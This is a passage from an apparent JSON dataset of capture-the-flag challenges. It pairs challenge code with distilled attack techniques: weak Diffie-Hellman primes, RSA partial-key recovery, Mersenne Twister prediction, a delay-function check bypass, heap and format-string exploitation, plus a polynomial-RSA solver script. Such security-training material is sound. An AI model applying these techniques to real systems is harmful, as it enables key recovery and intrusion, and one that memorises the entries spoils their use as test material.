        "key": "```python\nfrom random import *\nfrom Crypto.Util.number import *\nflag = b'REDACTED'\n#DEFINITION\nK = GF(0xfffffffffffffffffffffffffffffffeffffffffffffffff);a = K(0xfffffffffffffffffffffffffffffffefffffffffffffffc);b = K(0x64210519e59c80e70fa7e9ab72243049feb8deecc146b9b1)\nE = EllipticCurve(K, (a, b))\nG = E(0x188da80eb03090f67cbf20eb43a18800f4ff0afd82ff1012, 0x07192b95ffc8da78631011ed6b24cdd573f977a11e794811)\n\n#DAMAGE\ndef poison(val,index):\n    val = list(val)\n    if val[index] == '1':\n        val[index] = '0'\n    else:\n        val[index] = '1'\n    return ''.join(val)\n\nmy_priv = bin(bytes_to_long(flag))[2:]\nms = []\nC1s = []\nC2s = []\ndecs = []\n\ncount = 0\n\nwhile count < len(my_priv):\n    try:\n        k = randint(2, G.order()-2)\n        Q = int(my_priv,2)*G\n        M = randint(2,G.order()-2)\n        M = E.lift_x(Integer(M));ms.append((M[0],M[1]))\n\n        C1 = k*G;C1s.append((C1[0],C1[1]))\n        C2 = M + k*Q;C2s.append((C2[0],C2[1]))\n\n        ind = len(my_priv)-1-count\n        new_priv = poison(my_priv,ind)\n        new_priv = int(new_priv,2)\n        dec = (C2 - (new_priv)*C1);decs.append((dec[0],dec[1]))\n        count +=1\n    except:\n        pass\n\nwith open('out.txt','w') as f:\n    f.write(f'ms={ms}\\n')\n    f.write(f'C1s={C1s}\\n')\n    f.write(f'C2s={C2s}\\n')\n    f.write(f'decs={decs}')\n```"
    },
    {
        "name": "Poison Prime",
        "write_up": "dataset/raw/Poison Prime.md",
        "type": "crypto",
        "competition": [
            "CircleCityCon/2021",
            "https://ctftime.org/event/1350/tasks/"
        ],
        "score": 299,
        "max_score": 299,
        "difficulty": 1.0,
        "knowledge": [
            "In Diffie-Hellman key exchange challenges where the attacker can choose the prime `p`, selecting a Mersenne prime (`p = 2^k - 1`) forces any generator `g` into a small subgroup, making the system more vulnerable. The security of the system is compromised because the order of `g` becomes predictably small, limiting the complexity of the discrete logarithm problem.",
            "For ensuring the chosen prime `p` is not easily flagged as backdoored in challenges requiring a proof of a large prime factor of `p-1`, use factoring databases like http://factordb.com/ to find primes like `p` where `p-1` contains a large prime factor, meeting the validation requirements without compromising the ability to attack the implementation efficiently."
        ],
        "key": "```python  \nclass DiffieHellman:  \n   def __init__(self, p: int):  \n       self.p = p  \n       self.g = 8  \n       self.private_key = crr.getrandbits(128)\n\n   def public_key(self) -> int:  \n       return pow(self.g, self.private_key, self.p)\n\n   def shared_key(self, other_public_key: int) -> int:  \n       return pow(other_public_key, self.private_key, self.p)\n\ndef get_prime() -> int:  \n   p = int(input(\"Please help them choose p: \"))  \n   q = int(  \n       input(  \n           \"To prove your p isn't backdoored, \"  \n           + \"give me a large prime factor of (p - 1): \"  \n       )  \n   )\n\n   if (  \n       cun.size(q) > 128  \n       and p > q  \n       and (p - 1) % q == 0  \n       and cun.isPrime(q)  \n       and cun.isPrime(p)  \n   ):  \n       return p  \n   else:  \n       raise ValueError(\"Invalid prime\")\n\ndef main():  \n   print(\"Note: Your session ends in 30 seconds\")\n\n   message = \"My favorite food is \" + os.urandom(32).hex()  \n   print(\"Alice wants to send Bob a secret message\")\n\n   p = get_prime()  \n   alice = DiffieHellman(p)  \n   bob = DiffieHellman(p)\n\n   shared_key = bob.shared_key(alice.public_key())  \n   assert shared_key == alice.shared_key(bob.public_key())\n\n   aes_key = hashlib.sha1(cun.long_to_bytes(shared_key)).digest()[:16]  \n   cipher = AES.new(aes_key, AES.MODE_ECB)  \n   ciphertext = cipher.encrypt(cup.pad(message.encode(), 16))\n\n   print(\"Here's their encrypted message: \" + ciphertext.hex())\n\n   guess = input(\"Decrypt it and I'll give you the flag: \")  \n   if guess == message:  \n       print(\"Congrats! Here's the flag: \" + os.environ[\"FLAG\"])  \n   else:  \n       print(\"That's wrong dingus\")  \n```"
    },
    {
        "name": "Polish",
        "write_up": "dataset/raw/Polish.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 477,
        "max_score": 477,
        "difficulty": 1.0,
        "knowledge": [
            "When given the lower bits of the private key \\(d\\) in an RSA challenge, it's feasible to factorize the modulus \\(n\\) in polynomial time of the public exponent \\(e\\). This factorization can be achieved by solving quadratic congruences to compute candidates for the lower half bits of \\(p\\) or \\(q\\), and then applying Coppersmith's method for finding small roots of polynomials. This is based on the theoretical groundwork provided in \"Twenty Years of Attacks on the RSA Cryptosystem,\" which discusses utilizing the lower quarter of \\(d\\) bits for factorizing \\(n\\). This approach can be instrumental in challenges where partial key exposure allows for an attack route not immediately evident through conventional decryption or direct factorization attempts.",
            "In challenges involving diophantine equations as part of cryptographic schemes, transforming the equation to solve for variables in terms of others can simplify the problem. In the given challenge, the transformation process involves substituting variables \\(u = x + y\\) and \\(v = xy\\) into the equation to formulate a new equation that relates \\(u\\) and \\(v\\) in a manner that leverages the already established cryptographic relationships, such as factoring \\(n\\). Specifically, factoring the modified equation can lead to computing potential values for \\(u\\) and \\(v\\), and subsequently solving quadratic equations for \\(x\\) and \\(y\\). This method can be particularly effective in scenarios where indirect relationships between variables can be exploited to solve for unknowns, facilitating the decryption process or revealing hidden information necessary for challenge completion."
        ],
        "key": "```python\nm = bytes_to_long(flag)\n\ne = 65537\n\nn = p * q  \n =\n40246250034008312612597372763167482121403594640959033279625274444300931999548988739160328671767018778652394885185401059130887869211330599272113849088780129624581674441314938139267245340401649784020787977993123159165051168187958742107\n\nd =\n0b1[REDACTED]00001101110000010101000000101110000111101011011101111111000011110101111000100001011100001111011000010101010010111100000011000101000001110001111100001011001100010001100000011100001101101100011101000001010001100000101000001\n\nc = pow(x**2 + m + y, e, n)  \n =\n28505561807082805875299833176536442119874596699006698476186799206821274572541984841039970225569714867243464764627070206533293573878039612127495688810559746369298640670292301881186317254368892594525084237214035763200412059090430060075\n\nx**2 * (y -\n146700196613209180651680280746469710064760660116352037627587109421827052580531)\n+ y**2 * (x -\n146700196613209180651680280746469710064760660116352037627587109421827052580531)\n=\n27617741006445293346871979669264566397938197906017433294384347969002810245774095080855953181508639433683134768646569379922750075630984038851158577517435997971553106764846655038664493024213691627948571214899362078353364358736447296943  \n```"
    },
    {
        "name": "Polynomial Time",
        "write_up": "dataset/raw/Polynomial Time.md",
        "type": "crypto",
        "competition": [
            "KillerQueen/2021",
            "https://ctftime.org/event/1482/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When encountering a CTF challenge where the security of the system is based on the unpredictability of random numbers, if the system uses a Mersenne Twister pseudo-random number generator (PRNG) it can be exploited. Specifically, after observing 624 outputs from a Mersenne Twister, future outputs can be predicted. Utilizing libraries like `mt19937predictor`, one can predict the state of the PRNG and subsequently predict future outputs. These outputs could be crucial values such as keys or internal state variables.\n   - Condition: This approach applies when the challenge involves predicting future values of a PRNG that is known to be a Mersenne Twister, and at least 624 of its outputs can be observed directly or indirectly.\n   - Knowledge: By collecting and feeding 624 observed outputs into a prediction tool or library, future outputs of the PRNG can be calculated, potentially revealing sensitive information or enabling further exploitation.\n   - Example Payload: No specific payload, but the process involves collecting the outputs into an array and then using `predictor.getrandbits(512)` to predict future values.",
            "In challenges involving polynomial operations where the naive approach leads to prohibitively high time complexity, utilize algorithms or techniques that break down the problem into smaller parts or use faster algorithms for specific operations like FFT (Fast Fourier Transform) for polynomial multiplication. Specifically, for tasks that require evaluating a polynomial at multiple points efficiently, use multi-point evaluation algorithms which reduce the overall time complexity significantly, employing techniques like the construction of a binary tree of polynomials.\n   - Condition: This is applicable in scenarios where evaluating a polynomial at multiple points directly is too slow, typically due to the polynomial having a high degree or needing to evaluate at many points.\n   - Knowledge: Employ efficient algorithms for multi-point polynomial evaluation that leverage FFT or construct a binary tree where each node represents a polynomial, significantly reducing the time complexity from \\(O(n^2)\\) or \\(O(n^2 \\log n)\\) to \\(O(n \\log^2 n)\\).\n   - Example Payload: No specific payload, but the implementation involves creating a binary tree where leaf nodes represent the polynomials for individual points, and internal nodes represent the product of polynomials of their child nodes. Subsequently, evaluate the given polynomial mod the polynomial at each tree node to efficiently compute the desired evaluations at all points."
        ],
        "key": "```python\nimport time  \nimport numpy as np  \nimport random\n\ndef interpolate(l):  \n   for _ in range(624):  \n       x = random.getrandbits(32*2**4)  \n       print(x)  \n   mo = random.getrandbits(32*2**4)  \n   FR.<x> = PolynomialRing( IntegerModRing(mo) )  \n   f = prod([(random.getrandbits(32*2**4)*x-1) for _ in range(1,l)])  \n   return f, mo\n\nif __name__ == \"__main__\":  \n   with open(\"flag.txt\",\"r\") as f:  \n       flag = f.read()  \n  \n   size = 1048576  \n   poly, mo = interpolate(size)  \n   R = Integers(mo)  \n   points = [R(random.getrandbits(32*2**4)) for _ in range(size)]  \n   ans = bytearray.fromhex(hex(prod(evaluate(poly,points,mo)))[2:-10])  \n  \n  \n   ciphertext = bytearray(b\"\")  \n   for i, c in enumerate(flag):  \n       ciphertext.append(ord(c)^^ans[i])  \n  \n   print(ciphertext)  \n```"
    },
    {
        "name": "PolyRSA",
        "write_up": "dataset/raw/PolyRSA.md",
        "type": "crypto",
        "competition": [
            "InCTF/2020",
            "https://ctftime.org/event/981/tasks/"
        ],
        "score": 100,
        "max_score": 1000,
        "difficulty": 0.1,
        "knowledge": [
            "In challenges involving RSA over polynomial rings, the totient can be calculated using the formula `phi(n) = (p^f1.degree()-1)*(p^f2.degree()-1)*...*(p^fk.degree()-1)`, where `f1, f2, ..., fk` are the polynomial factors of `n`. This is crucial for determining the decryption exponent `d` in polynomial-ring-based RSA cryptosystems. Condition: This approach is applicable when working with RSA cryptography implemented in polynomial rings and requires factorization of the polynomial `n`.",
            "The decryption process in RSA challenges involving polynomial rings involves computing the inverse of the encryption exponent `e` modulo the totient of `n` (calculated using the formula in point 1), followed by raising the ciphertext polynomial to the power of this decryption exponent `d` modulo the polynomial `n`. This method can reveal the flag when each coefficient of the resulting polynomial represents an ASCII value of the flag characters. Condition: This method is used for decrypting messages in RSA schemes based on polynomial rings, assuming the ability to factorize `n` and convert polynomial coefficients to readable ASCII text."
        ],
        "key": "```python\np = 2470567871  \nP.<x> = PolynomialRing(Zmod(p))  \nn = 1932231392*x^255 + 1432733708*x^254 + 1270867914*x^253 + 1573324635*x^252\n+ 2378103997*x^251 + 820889786*x^250 + 762279735*x^249 + 1378353578*x^248 +\n1226179520*x^247 + 657116276*x^246 + 1264717357*x^245 + 1015587392*x^244 +\n849699356*x^243 + 1509168990*x^242 + 2407367106*x^241 + 873379233*x^240 +\n2391647981*x^239 + 517715639*x^238 + 828941376*x^237 + 843708018*x^236 +\n1526075137*x^235 + 1499291590*x^234 + 235611028*x^233 + 19615265*x^232 +\n53338886*x^231 + 434434839*x^230 + 902171938*x^229 + 516444143*x^228 +\n1984443642*x^227 + 966493372*x^226 + 1166227650*x^225 + 1824442929*x^224 +\n930231465*x^223 + 1664522302*x^222 + 1067203343*x^221 + 28569139*x^220 +\n2327926559*x^219 + 899788156*x^218 + 296985783*x^217 + 1144578716*x^216 +\n340677494*x^215 + 254306901*x^214 + 766641243*x^213 + 1882320336*x^212 +\n2139903463*x^211 + 1904225023*x^210 + 475412928*x^209 + 127723603*x^208 +\n2015416361*x^207 + 1500078813*x^206 + 1845826007*x^205 + 797486240*x^204 +\n85924125*x^203 + 1921772796*x^202 + 1322682658*x^201 + 2372929383*x^200 +\n1323964787*x^199 + 1302258424*x^198 + 271875267*x^197 + 1297768962*x^196 +\n2147341770*x^195 + 1665066191*x^194 + 2342921569*x^193 + 1450622685*x^192 +\n1453466049*x^191 + 1105227173*x^190 + 2357717379*x^189 + 1044263540*x^188 +\n697816284*x^187 + 647124526*x^186 + 1414769298*x^185 + 657373752*x^184 +\n91863906*x^183 + 1095083181*x^182 + 658171402*x^181 + 75339882*x^180 +\n2216678027*x^179 + 2208320155*x^178 + 1351845267*x^177 + 1740451894*x^176 +\n1302531891*x^175 + 320751753*x^174 + 1303477598*x^173 + 783321123*x^172 +\n1400145206*x^171 + 1379768234*x^170 + 1191445903*x^169 + 946530449*x^168 +\n2008674144*x^167 + 2247371104*x^166 + 1267042416*x^165 + 1795774455*x^164 +\n1976911493*x^163 + 167037165*x^162 + 1848717750*x^161 + 573072954*x^160 +\n1126046031*x^159 + 376257986*x^158 + 1001726783*x^157 + 2250967824*x^156 +\n2339380314*x^155 + 571922874*x^154 + 961000788*x^153 + 306686020*x^152 +\n80717392*x^151 + 2454799241*x^150 + 1005427673*x^149 + 1032257735*x^148 +\n593980163*x^147 + 1656568780*x^146 + 1865541316*x^145 + 2003844061*x^144 +\n1265566902*x^143 + 573548790*x^142 + 494063408*x^141 + 1722266624*x^140 +\n938551278*x^139 + 2284832499*x^138 + 597191613*x^137 + 476121126*x^136 +\n1237943942*x^135 + 275861976*x^134 + 1603993606*x^133 + 1895285286*x^132 +\n589034062*x^131 + 713986937*x^130 + 1206118526*x^129 + 311679750*x^128 +\n1989860861*x^127 + 1551409650*x^126 + 2188452501*x^125 + 1175930901*x^124 +\n1991529213*x^123 + 2019090583*x^122 + 215965300*x^121 + 532432639*x^120 +\n1148806816*x^119 + 493362403*x^118 + 2166920790*x^117 + 185609624*x^116 +\n184370704*x^115 + 2141702861*x^114 + 223551915*x^113 + 298497455*x^112 +\n722376028*x^111 + 678813029*x^110 + 915121681*x^109 + 1107871854*x^108 +\n1369194845*x^107 + 328165402*x^106 + 1792110161*x^105 + 798151427*x^104 +\n954952187*x^103 + 471555401*x^102 + 68969853*x^101 + 453598910*x^100 +\n2458706380*x^99 + 889221741*x^98 + 320515821*x^97 + 1549538476*x^96 +\n909607400*x^95 + 499973742*x^94 + 552728308*x^93 + 1538610725*x^92 +\n186272117*x^91 + 862153635*x^90 + 981463824*x^89 + 2400233482*x^88 +\n1742475067*x^87 + 437801940*x^86 + 1504315277*x^85 + 1756497351*x^84 +\n197089583*x^83 + 2082285292*x^82 + 109369793*x^81 + 2197572728*x^80 +\n107235697*x^79 + 567322310*x^78 + 1755205142*x^77 + 1089091449*x^76 +\n1993836978*x^75 + 2393709429*x^74 + 170647828*x^73 + 1205814501*x^72 +\n2444570340*x^71 + 328372190*x^70 + 1929704306*x^69 + 717796715*x^68 +\n1057597610*x^67 + 482243092*x^66 + 277530014*x^65 + 2393168828*x^64 +\n12380707*x^63 + 1108646500*x^62 + 637721571*x^61 + 604983755*x^60 +\n1142068056*x^59 + 1911643955*x^58 + 1713852330*x^57 + 1757273231*x^56 +\n1778819295*x^55 + 957146826*x^54 + 900005615*x^53 + 521467961*x^52 +\n1255707235*x^51 + 861871574*x^50 + 397953653*x^49 + 1259753202*x^48 +\n471431762*x^47 + 1245956917*x^46 + 1688297180*x^45 + 1536178591*x^44 +\n1833258462*x^43 + 1369087493*x^42 + 459426544*x^41 + 418389643*x^40 +\n1800239647*x^39 + 2467433889*x^38 + 477713059*x^37 + 1898813986*x^36 +\n2202042708*x^35 + 894088738*x^34 + 1204601190*x^33 + 1592921228*x^32 +\n2234027582*x^31 + 1308900201*x^30 + 461430959*x^29 + 718926726*x^28 +\n2081988029*x^27 + 1337342428*x^26 + 2039153142*x^25 + 1364177470*x^24 +\n613659517*x^23 + 853968854*x^22 + 1013582418*x^21 + 1167857934*x^20 +\n2014147362*x^19 + 1083466865*x^18 + 1091690302*x^17 + 302196939*x^16 +\n1946675573*x^15 + 2450124113*x^14 + 1199066291*x^13 + 401889502*x^12 +\n712045611*x^11 + 1850096904*x^10 + 1808400208*x^9 + 1567687877*x^8 +\n2013445952*x^7 + 2435360770*x^6 + 2414019676*x^5 + 2277377050*x^4 +\n2148341337*x^3 + 1073721716*x^2 + 1045363399*x + 1809685811  \nct = 1208612545*x^254 + 1003144104*x^253 + 1173365710*x^252 + 1528252326*x^251\n+ 2263767409*x^250 + 2030579621*x^249 + 820048372*x^248 + 1474305505*x^247 +\n1313951805*x^246 + 191260021*x^245 + 687901467*x^244 + 231907128*x^243 +\n1757265648*x^242 + 1536859261*x^241 + 97792274*x^240 + 86150615*x^239 +\n2283802022*x^238 + 728791370*x^237 + 1402241073*x^236 + 2010876897*x^235 +\n1112960608*x^234 + 1785301939*x^233 + 862124720*x^232 + 573190801*x^231 +\n1353395115*x^230 + 1041912948*x^229 + 1592516519*x^228 + 2043096090*x^227 +\n970437868*x^226 + 945296597*x^225 + 764979415*x^224 + 151795004*x^223 +\n744776063*x^222 + 49064457*x^221 + 379720326*x^220 + 549708067*x^219 +\n1278937325*x^218 + 1348751857*x^217 + 897039278*x^216 + 1738651055*x^215 +\n1458044806*x^214 + 947593966*x^213 + 604294495*x^212 + 1101712128*x^211 +\n1106608879*x^210 + 556697284*x^209 + 339078898*x^208 + 135886774*x^207 +\n682237064*x^206 + 1298394254*x^205 + 2038363686*x^204 + 1138996508*x^203 +\n321551693*x^202 + 1194023535*x^201 + 1627100598*x^200 + 581786959*x^199 +\n209400153*x^198 + 1354413890*x^197 + 1689568849*x^196 + 1038349567*x^195 +\n2129265853*x^194 + 96150366*x^193 + 1879712323*x^192 + 140146576*x^191 +\n855348682*x^190 + 571231503*x^189 + 1759489757*x^188 + 1528175919*x^187 +\n1420729777*x^186 + 1778060705*x^185 + 204520875*x^184 + 2409946047*x^183 +\n1703900286*x^182 + 379350638*x^181 + 145936788*x^180 + 644037909*x^179 +\n946490870*x^178 + 2143460817*x^177 + 2124654819*x^176 + 735909283*x^175 +\n1956333192*x^174 + 69508572*x^173 + 1998473705*x^172 + 2219097711*x^171 +\n2324764950*x^170 + 1295835297*x^169 + 475763021*x^168 + 124896627*x^167 +\n392652227*x^166 + 2414019050*x^165 + 519556546*x^164 + 2379934828*x^163 +\n74942046*x^162 + 2333943359*x^161 + 5807728*x^160 + 1572302913*x^159 +\n933057583*x^158 + 2327572070*x^157 + 2174172163*x^156 + 326654947*x^155 +\n2362777406*x^154 + 1571381551*x^153 + 818720017*x^152 + 564409161*x^151 +\n784212625*x^150 + 2084631116*x^149 + 1709163682*x^148 + 1791572159*x^147 +\n2362306858*x^146 + 1870950847*x^145 + 936293454*x^144 + 1992907305*x^143 +\n2427866610*x^142 + 1377299939*x^141 + 2336147340*x^140 + 419537038*x^139 +\n1775945090*x^138 + 1084486367*x^137 + 1628708302*x^136 + 624109245*x^135 +\n1140675451*x^134 + 848915999*x^133 + 1380203834*x^132 + 103496883*x^131 +\n81739774*x^130 + 2055692293*x^129 + 1586687843*x^128 + 1682316161*x^127 +\n134734383*x^126 + 885001299*x^125 + 2466212723*x^124 + 137905246*x^123 +\n2305925724*x^122 + 410043787*x^121 + 2154453335*x^120 + 2018367068*x^119 +\n1967315089*x^118 + 220606010*x^117 + 1066579186*x^116 + 2022385524*x^115 +\n1564928688*x^114 + 851080667*x^113 + 1683812556*x^112 + 672848621*x^111 +\n646553151*x^110 + 1348955204*x^109 + 1543570099*x^108 + 2260622184*x^107 +\n1111757240*x^106 + 1797688791*x^105 + 1307761272*x^104 + 179896670*x^103 +\n1197947306*x^102 + 1792231092*x^101 + 1515817157*x^100 + 1510541452*x^99 +\n1784535666*x^98 + 1755403646*x^97 + 2388416288*x^96 + 1913808879*x^95 +\n2139772089*x^94 + 1373043969*x^93 + 900021127*x^92 + 1613888837*x^91 +\n331160696*x^90 + 2404083812*x^89 + 448818904*x^88 + 592910594*x^87 +\n2436296390*x^86 + 2103089380*x^85 + 2027661376*x^84 + 277165788*x^83 +\n717390488*x^82 + 319876555*x^81 + 1394843317*x^80 + 2314542109*x^79 +\n2295617403*x^78 + 313842193*x^77 + 1918458371*x^76 + 1189324530*x^75 +\n1765150225*x^74 + 1107038066*x^73 + 613811679*x^72 + 578744934*x^71 +\n538203467*x^70 + 1710976133*x^69 + 1681208001*x^68 + 462043988*x^67 +\n299437516*x^66 + 1843758398*x^65 + 851754779*x^64 + 1850189150*x^63 +\n710529550*x^62 + 922473306*x^61 + 2344816934*x^60 + 54182289*x^59 +\n2394694981*x^58 + 1849818608*x^57 + 1926799414*x^56 + 950266030*x^55 +\n1290713338*x^54 + 1851455277*x^53 + 1607851092*x^52 + 1587576465*x^51 +\n2279226257*x^50 + 1637387507*x^49 + 779327218*x^48 + 919124653*x^47 +\n1126060258*x^46 + 2304179492*x^45 + 77984480*x^44 + 966167063*x^43 +\n402292668*x^42 + 1332816563*x^41 + 524746316*x^40 + 2427530022*x^39 +\n677075099*x^38 + 755256194*x^37 + 2152433299*x^36 + 2197374397*x^35 +\n2290208129*x^34 + 996810109*x^33 + 101994796*x^32 + 252415814*x^31 +\n1964967972*x^30 + 1533782356*x^29 + 1034980624*x^28 + 816216163*x^27 +\n1535614986*x^26 + 1835762944*x^25 + 1147606118*x^24 + 1189426347*x^23 +\n33594119*x^22 + 2113251273*x^21 + 826059142*x^20 + 1074101610*x^19 +\n1638140405*x^18 + 1633380033*x^17 + 2005588694*x^16 + 2087514746*x^15 +\n768034353*x^14 + 104476320*x^13 + 483234608*x^12 + 2424146196*x^11 +\n49841203*x^10 + 145673059*x^9 + 705090263*x^8 + 1832451737*x^7 +\n2394175351*x^6 + 1966712784*x^5 + 276537935*x^4 + 499607533*x^3 +\n1981107449*x^2 + 776654074*x + 886398299  \ne = 65537  \nq1, q2 = n.factor()  \nq1, q2 = q1[0], q2[0]  \ns = (p**q1.degree() - 1) * (p**q2.degree() - 1)  \nd = inverse_mod(e,s)  \npt = pow(ct, d, n)  \nprint(''.join([chr(c) for c in pt.coefficients()]))  \n```"
    },
    {
        "name": "pow-pow",
        "write_up": "dataset/raw/pow-pow.md",
        "type": "crypto",
        "competition": [
            "DiceCTF/2022",
            "https://ctftime.org/event/1541/tasks/"
        ],
        "score": 299,
        "max_score": 500,
        "difficulty": 0.598,
        "knowledge": [
            "In challenges featuring verifiable delay functions (VDFs) where the verification function is provided, it is possible to manipulate inputs to satisfy the verification without executing the intended costly computation. This is achieved by selecting specific values that conform to the verification function's requirements in an unintended way. For instance, choosing a parameter such that its order or its relation to other parameters simplifies the verification equation, thereby bypassing the need for the intended long computation.",
            "For solving challenges that involve operations with large numbers and congruences under modular arithmetic, using smooth numbers (numbers with only small prime factors) can significantly simplify computations. Specifically, selecting a value that is a product of small prime numbers (such as the factorial of a number or the product of all primes below a certain threshold) can make it divisible by a wide range of other numbers, including those generated dynamically within the challenge's logic. This approach is particularly effective in scenarios where the challenge involves random or pseudorandom values that need to be factored into or divided by the selected value.\n\n**Example Payload:**\n- No specific payload is given, but the method involves generating a \"smooth\" number, typically the product of primes up to a certain threshold, and using this to manipulate challenge parameters in a way that satisfies the verification equation without performing the intended computation."
        ],
        "key": "```python\ndef verify(g, h, pi):  \n   assert is_valid(g)  \n   assert is_valid(h)  \n   assert is_valid(pi)  \n   assert g != 1 and g != n - 1  \n   m = H(g, h)  \n   r = pow(2, T, m)  \n   assert h == pow(pi, m, n) * pow(g, r, n) % n\n```"
    },
    {
        "name": "PQ",
        "write_up": "dataset/raw/PQ.md",
        "type": "crypto",
        "competition": [
            "TSG/2019",
            "https://ctftime.org/event/758/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In scenarios involving RSA encryption challenges where the encrypted message and public key (N, e) are provided, but the prime factors (p, q) are unknown, factorization tools or libraries like `sympy` can be used to find these prime factors. This technique is especially effective when the product of p and q (N) is not too large, allowing for successful factorization. Once the prime factors are determined, they can be used to compute the private key component (d), essential for decrypting the message.",
            "To calculate the modular inverse of two numbers, which is a crucial step in computing the private key (d) in RSA encryption, the Extended Euclidean Algorithm (EGCD) can be utilized. This algorithm not only finds the greatest common divisor (GCD) of two numbers but also the coefficients (x and y) that satisfy the equation ax + by = gcd(a, b). In the context of RSA, obtaining the modular inverse of e mod phi(N) (where phi(N) is Euler's totient function of N), is necessary for finding the decryption key d. This approach is universally applicable for reconstructing private keys in RSA when the prime factors of N are known. \n\nExample of computing modular inverse using EGCD:\n```python\ndef egcd(a, b):  \n    if a == 0:  \n        return (b, 0, 1)  \n    g, y, x = egcd(b % a, a)  \n    return (g, x - (b // a) * y, y)\n\ndef modinv(a, m):  \n    g, x, y = egcd(a, m)  \n    if g != 1:  \n        raise Exception('modular inverse does not exist')  \n    else:  \n        return x % m\n```"
        ],
        "key": "```python\nfrom secret import flag  \nimport gmpy2  \nimport os\n\ne = 65537\n\ndef generate_pq():  \n   seed_1 = os.urandom(256)  \n   seed_2 = os.urandom(128)\n\n   p = gmpy2.next_prime(int.from_bytes(seed_1, 'big'))  \n   q = gmpy2.next_prime(p + int.from_bytes(seed_2, 'big'))\n\n   return p, q\n\ndef crypt(text: bytes, number: int, n: int) -> bytes:  \n   encrypted_int = pow(int.from_bytes(text, 'big'), number, n)\n\n   return int(encrypted_int).to_bytes(n.bit_length() // 8 + 1,\n'big').lstrip(b'\\x00')\n\ndef decrypt(ciphertext: bytes, d: int, n: int) -> bytes:  \n   decrypted_int = pow(int.from_bytes(ciphertext, 'big'), d, n)\n\n   return int(decrypted_int).to_bytes(n.bit_length() // 8 + 1,\n'big').lstrip(b'\\x00')\n\nif __name__ == '__main__':  \n   p, q = generate_pq()\n\n   N = p * q\n\n   print(N)  \n   print(crypt(flag, e, N))  \n```"
    },
    {
        "name": "Precise average",
        "write_up": "dataset/raw/Precise average.md",
        "type": "reverse",
        "competition": [
            "ASIS/2019/Quals",
            "https://ctftime.org/event/732/tasks/"
        ],
        "score": 104,
        "max_score": 500,
        "difficulty": 0.208,
        "knowledge": [
            "When exploiting off-by-one vulnerabilities in heap exploitation challenges, manipulating the metadata of adjacent memory chunks can enable arbitrary memory writes or information leaks. Specifically, altering the size of a chunk can allow for overlapping chunks which can be used to leak libc addresses or facilitate double-free vulnerabilities for further exploitation.",
            "In challenges involving format string vulnerabilities, especially when canary protection is present, it may be possible to bypass this protection and achieve arbitrary code execution by carefully crafting input to avoid overwriting critical security features. For example, using input that causes `scanf` to fail (like \"-\") can prevent the overwrite of the canary while still causing a stack buffer overflow, allowing for control over the program's execution flow without triggering security mechanisms."
        ],
        "key": "```c\n#include <stdio.h>  \n#include <stdlib.h>  \n#include <stdbool.h>\n\nbool sub_40140A(char *secret)  \n{  \n size_t v1; // r12  \n size_t v2; // r12  \n bool ret; // al  \n int v4; // [rsp+1Ch] [rbp-34h]  \n int v5; // [rsp+34h] [rbp-1Ch]  \n int v6; // [rsp+38h] [rbp-18h]  \n int sint; // [rsp+3Ch] [rbp-14h]\n\n sint = strtol(secret, 0LL, 10);  \n ret = 0;  \n if ( sint % (strlen(secret) + 2) || secret[4] != '1' )  \n   return ret;  \n v6 = sint / 100000;  \n v5 = sint % 10000;  \n if ( 10 * (sint % 10000 / 1000) + sint % 10000 % 100 / 10 - (10 * (sint /\n100000 / 1000) + sint / 100000 % 10) != 1  \n   || 10 * (v6 / 100 % 10) + v6 / 10 % 10 - 2 * (10 * (v5 % 100 / 10) + v5 %\n1000 / 100) != 8 )  \n {  \n   return ret;  \n }  \n v4 = 10 * (v5 / 100 % 10) + v5 % 10;  \n if ( (10 * (v6 % 10) + v6 / 100 % 10) / v4 != 3 || (10 * (v6 % 10) + v6 / 100\n% 10) % v4 )  \n   return ret;  \n v1 = strlen(secret) + 2;  \n v2 = (strlen(secret) + 2) * v1;  \n if ( sint % (v5 * v6) == v2 * (strlen(secret) + 2) + 6 )  \n   ret = 1;  \n return ret;  \n}\n\nchar buf[0x100];\n\nint main(int argc, char const *argv[])  \n{  \n for (size_t i = 0; i < 0x100000000; ++i)  \n {  \n   snprintf(buf, sizeof(buf), \"%d\", (int)i);  \n   if (sub_40140A(buf))  \n     puts(buf);//790317143  \n }  \n return 0;  \n}  \n```\n\n```c\n#include <stdio.h>  \n#include <dlfcn.h>  \n#include <memory.h>  \ntypedef int (*func_t)(char *);  \nchar buf[0x100];  \nchar key[0x100];\n\n//to clear the stack of verification function,  \n//because use of `strncpy` will cause uninitialized variable access (no null\nterminate)  \n//which causes unexpected results if `strcat` is called to that string later  \nvoid clear_stack()  \n{  \n\tchar buf[0x1000];  \n\tmemset(buf, 0, sizeof(buf));  \n}\n\nint main(int argc, char const *argv[])  \n{  \n\tchar* addr = *(char**)dlopen(\"./silkroad_2.elf\", RTLD_NOW | RTLD_GLOBAL);  \n\tfunc_t f = (func_t)(addr + 0x1C06);  \n\tfor (int i = 0; i < 0x3b9aca00; ++i)  \n\t{  \n\t\tsprintf(buf, \"%.9d\", i);  \n\t\tfor (int i = 0; i < 4; ++i)  \n\t\t{  \n\t\t\tkey[i] = buf[i];  \n\t\t}  \n\t\tfor (int i = 0; i < 5; ++i)  \n\t\t{  \n\t\t\tkey[6 + i] = buf[4 + i];  \n\t\t}  \n\t\tkey[4] = '1';  \n\t\tkey[5] = '1';//4,5 must be length, which is always 11  \n\t\tkey[11] = 0;  \n\t\tclear_stack();  \n\t\tif (f(key) == 1)  \n\t\t\tputs(buf);  \n\t}  \n\treturn 0;  \n}  \n```\n\n```c\nsigned __int64 __fastcall sub_1FCA(char *input)  \n{  \n int v1; // eax  \n int v2; // ST1C_4  \n unsigned __int64 v3; // rbx  \n size_t v4; // r12  \n size_t v5; // r12  \n char v6; // bl  \n int v7; // ebx  \n int v8; // ebx  \n size_t v9; // rax  \n signed __int64 result; // rax  \n signed int i; // [rsp+14h] [rbp-4Ch]  \n signed int j; // [rsp+14h] [rbp-4Ch]  \n signed int k; // [rsp+14h] [rbp-4Ch]  \n signed int l; // [rsp+14h] [rbp-4Ch]  \n char _1337[5]; // [rsp+22h] [rbp-3Eh]  \n char v16[6]; // [rsp+27h] [rbp-39h]  \n char v17[6]; // [rsp+2Dh] [rbp-33h]  \n char haystack[6]; // [rsp+33h] [rbp-2Dh]  \n char v19[15]; // [rsp+39h] [rbp-27h]  \n 